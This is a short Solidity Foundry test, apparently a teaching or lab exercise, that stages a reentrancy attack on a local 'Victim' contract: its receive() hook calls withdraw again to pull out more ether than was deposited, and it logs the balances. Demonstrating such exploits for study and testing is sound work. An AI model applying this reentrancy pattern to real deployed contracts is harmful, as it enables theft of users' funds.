// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

import {Test, console} from "forge-std/Test.sol";
import {Victim} from "../src/Victim.sol";

contract AttackTest is Test {
  Victim public victim;

  bool reenter;
  uint amount = 1 ether;
  uint firstAmount = 2 ether;

  function setUp() public {
    victim = new Victim();
    vm.deal(address(this), 1 ether);
    vm.deal(address(victim), 11 ether);
  }

  receive() external payable {
   if (!reenter) { 
     reenter = true;
     victim.withdraw(firstAmount);
   }
  }

  function test_reetrance() public {
    victim.deposit{value: amount}();

    console.log("BalanceVictim:", address(victim).balance);
    console.log("Balance:", address(this).balance);

    victim.withdraw(amount);

    console.log("BalanceVictim:", address(victim).balance);
    console.log("Balance:", address(this).balance);
  }
}
